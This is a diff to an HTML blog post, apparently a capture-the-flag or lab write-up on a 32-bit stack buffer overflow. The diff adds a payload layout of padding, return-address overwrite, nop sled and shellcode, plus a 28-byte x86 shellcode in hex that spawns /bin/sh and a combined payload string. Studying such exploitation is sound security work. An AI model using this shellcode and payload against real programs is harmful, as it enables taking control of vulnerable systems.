@@ -70,7 +70,7 @@
 
 <p class="post-metadata text-muted">
   28 June 2022 -  
-  <b>6 mins read time</b>
+  <b>7 mins read time</b>
 
   <br></p>
 
@@ -178,9 +178,24 @@ Dump of assembler code for function _start:
 <p>So our mission is to overflow the 0xffffce18 address (the _exit function) and it will return to whatever address we want. We have a padding of 20 bytes and 4 bytes payload to overwrite the address.</p>
 
 <h4 id="overwrite-the-return-address">Overwrite the return address</h4>
-<p>Now we just overwrite the exit address with 0xffffce04, which is top of the stack. So our payload will look something like this:</p>
+<p>So what do we overwrite the return address with? The payload can’t be simply AAAAAAAAAAAAAAAAAAAA + buffer address since it will just jump to a bunch of As. Maybe we can do something like this:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AAAAAAAAAAAAAAAAAAAABBBB
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  AAAAA...AAAAAAA        +       shellcode address       +       nop sled  +      shellcode
+────────────────────           ────────────────────
+         ▼                              ▼
+  20 As of padding                4bytes overflowing ret
+</code></pre></div></div>
+
+<p>Just search for shellcode on Google and get the 28 bytes one.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\x31\xc0\x50\x68\x2f\x2f\x73
+\x68\x68\x2f\x62\x69\x6e\x89
+\xe3\x89\xc1\x89\xc2\xb0\x0b
+\xcd\x80\x31\xc0\x40\xcd\x80
+</code></pre></div></div>
+
+<p>Now we try to locate the address of the nop sled.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AAAAAAAAAAAAAAAAAAAABBBB\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
 </code></pre></div></div>
 
 
